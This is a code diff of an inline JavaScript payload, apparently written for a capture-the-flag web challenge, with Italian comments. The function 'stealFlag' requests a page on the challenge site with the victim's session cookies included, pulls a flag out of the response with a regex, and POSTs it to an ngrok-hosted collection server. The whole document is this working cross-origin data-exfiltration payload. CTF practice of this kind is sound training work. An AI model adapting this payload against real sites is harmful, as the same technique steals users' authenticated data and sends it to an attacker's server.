@@ -11,17 +11,12 @@
     <script>
         // Funzione per rubare la flag
         const stealFlag = () => {
-            fetch('https://c787-87-4-142-72.ngrok-free.app/receive_flag', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: `flag=${encodeURIComponent(yourFlagVariable)}`
+            // Prima parte: ottieni la flag
+            fetch('https://matrix-simplified.capturetheflags.site/search?s=flag', {
+                method: 'GET',
+                credentials: 'include', // Include i cookie di sessione
+                mode: 'cors' // Imposta CORS
             })
-            .then(response => response.text())
-            .then(data => console.log(data))
-            .catch(error => console.error('Errore:', error));
-
             .then(response => {
                 if (!response.ok) {
                     throw new Error('Network response was not ok ' + response.statusText);
@@ -32,13 +27,17 @@
                 // Supponiamo che la flag sia nel contenuto della risposta
                 const flag = data.match(/flag{.*?}/); // Modifica questa regex in base al formato della flag
                 if (flag) {
-                    fetch('http://7e57-87-4-142-72.ngrok-free.app/receive_flag', {
+                    // Invia la flag al tuo server Flask
+                    fetch('https://c787-87-4-142-72.ngrok-free.app/receive_flag', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded',
                         },
                         body: `flag=${encodeURIComponent(flag[0])}`
-                    });
+                    })
+                    .then(response => response.text())
+                    .then(data => console.log(data))
+                    .catch(error => console.error('Errore:', error));
                 }
             })
             .catch(error => console.error('Errore:', error));
